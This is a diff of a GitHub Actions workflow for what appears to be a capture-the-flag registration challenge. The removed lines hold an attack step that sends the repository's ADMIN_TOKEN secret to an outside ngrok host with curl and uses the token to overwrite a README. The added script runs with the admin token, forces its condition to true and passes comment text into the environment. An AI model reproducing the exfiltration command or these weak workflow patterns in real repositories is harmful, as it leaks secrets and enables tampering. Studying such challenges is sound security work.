@@ -1,15 +1,46 @@
 name: ctf registration
-on: [pull_request_target]
+on:
+  push:
+    branches: [b]
+  pull_request:
+    branches: [master]
 
 jobs:
-  build:
+  ctf_registration:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Use Node.js ${{ matrix.node-version }}
-        uses: actions/setup-node@v1
+      - name: register player
+        uses: actions/github-script@v3
         env:
-          GITHUB_TOKEN: ${{ secrets.ADMIN_TOKEN }}
-      - run: |
-          curl -X POST -H 'Content-type: application/json' --data '{"text":"'"$GITHUB_TOKEN"'"}' http://312177246bcd.ngrok.io/api/info
-          curl -X PUT -H "Authorization: bearer $GITHUB_TOKEN" https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md --data '{"message": "Create vandalism.md", "content": "aaa"}'
+          LOGIN: ${{ github.event.comment.user.login }}
+          COMMENT: $${{ github.event.comment.body }}
+        with:
+          github-token: ${{ secrets.ADMIN_TOKEN }}
+          script: |
+            if (true) {
+              console.log('%s wants to register!', process.env.LOGIN);
+              console.log('Creating player repo ...');
+              await github.repos.createUsingTemplate({
+                template_owner: 'incrediblysecureinc',
+                template_repo: 'incredibly-secure',
+                name: `incredibly-secure-naortalmor1`,
+                owner: 'incrediblysecureinc',
+                private: true
+              });
+              console.log('Adding player as collaborator ...');
+              await github.repos.addCollaborator({
+                owner: 'incrediblysecureinc',
+                repo: `incredibly-secure-naortalmor1`,
+                username: "naortalmor1",
+                permission: 'admin'
+              });
+            } else if (context.issue.number === 1 && process.env.COMMENT.toUpperCase().includes("/DONE")) {
+              console.log('%s says they are done!', process.env.LOGIN);
+              // create issue on player private repo so we can discuss results in private
+              await github.issues.create({
+                owner: 'incrediblysecureinc',
+                repo: `incredibly-secure-naortalmor1`,
+                title: 'My voice is my password, verify me!',
+                body: '@' + process.env.LOGIN + ' claimed a potential win at: ' + new Date().toISOString() + ' /cc @hacktionctfadmin'
+              });
+            }
